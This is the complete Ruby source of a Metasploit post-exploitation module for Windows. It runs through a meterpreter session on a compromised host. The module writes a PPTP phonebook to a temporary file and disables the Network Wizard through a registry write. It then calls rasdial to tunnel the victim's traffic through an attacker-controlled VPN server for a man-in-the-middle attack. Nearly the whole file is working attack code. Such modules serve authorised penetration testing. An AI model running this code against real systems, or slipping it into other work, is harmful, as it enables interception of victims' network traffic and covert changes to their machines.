##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Manage Remote Point-to-Point Tunneling Protocol',
        'Description' => %q{
          This module initiates a PPTP connection to a remote machine (VPN server). Once
          the tunnel is created we can use it to force the victim traffic to go through the
          server getting a man in the middle attack. Be sure to allow forwarding and
          masquerading on the VPN server (mitm).
        },
        'License' => MSF_LICENSE,
        'Author' => 'Borja Merino <bmerinofe[at]gmail.com>',
        'References' => [
          [ 'URL', 'https://www.youtube.com/watch?v=vdppEZjMPCM&hd=1' ]
        ],
        'Platform' => 'win',
        'SessionTypes' => [ 'meterpreter' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [CONFIG_CHANGES],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [true, 'VPN Username.' ]),
        OptString.new('PASSWORD', [true, 'VPN Password.' ]),
        OptBool.new('MITM', [true, 'Man in the middle.', true]),
        OptInt.new('TIMEOUT', [true, 'Timeout for the tunnel creation.', 60]),
        OptString.new('PBK_NAME', [true, 'PhoneBook entry name.', 'MSF']),
        OptAddress.new('VPNHOST', [true, 'VPN server.'])
      ]
    )
  end

  def run
    version = get_version_info
    disable_network_wizard if version.build_number.between?(Msf::WindowsVersion::Vista_SP0, Msf::WindowsVersion::Win7_SP1)

    pbk = create_pbk(datastore['MITM'], datastore['PBK_NAME'])
    to = (datastore['TIMEOUT'] <= 0) ? 60 : datastore['TIMEOUT']
    begin
      ::Timeout.timeout(to) do
        run_rasdial(pbk, datastore['USERNAME'], datastore['PASSWORD'], datastore['VPNHOST'], datastore['PBK_NAME'])
      end
    rescue ::Timeout::Error
      print_error("Timeout after #{to} seconds")
    end
    file_rm(pbk)
    print_status('Phonebook deleted')
  end

  def disable_network_wizard
    if !is_admin?
      print_error("You don't have enough privileges to change the registry. Network Wizard will not be disabled")
      return
    end

    key = 'HKLM\\System\\CurrentControlSet\\Control\\Network'
    value = 'NewNetworkWindowOff'
    begin
      if !registry_getvaldata(key, value)
        registry_setvaldata(key, value, 3, 'REG_BINARY')
        print_good('Network Wizard disabled')
      end
    rescue StandardError => e
      print_status("The following error was encountered: #{e.class} #{e}")
    end
  end

  def create_pbk(mim, pbk_name)
    pbk_dir = expand_path('%TEMP%')
    pbk_file = pbk_dir << '\\' << Rex::Text.rand_text_alpha(6..13) << '.pbk'

    conf_conn = "[#{pbk_name}]\r\n\r\n"
    conf_conn += "MEDIA=rastapi\r\n"
    conf_conn += "Port=VPN4-0\r\n"
    conf_conn += "DEVICE=vpn\r\n"
    conf_conn += "IpPrioritizeRemote=0\r\n" unless mim

    if write_file(pbk_file, conf_conn)
      print_good("PhoneBook configuration written to #{pbk_file}")
      return pbk_file
    end
  end

  def run_rasdial(pbk, user, pass, vpn_host, pbk_name)
    print_status('Establishing connection ...')
    cmd_exec('rasdial', '/disconnect')
    output_run = cmd_exec('rasdial', "#{pbk_name} #{user} #{pass} /PHONE:#{vpn_host} /PHONEBOOK:#{pbk}")
    output_view = cmd_exec('rasdial', nil)

    if output_view =~ /#{pbk_name}/i
      print_good('Connection Successful')
    else
      print_error("Connection failure: #{output_run}")
    end
  end
end
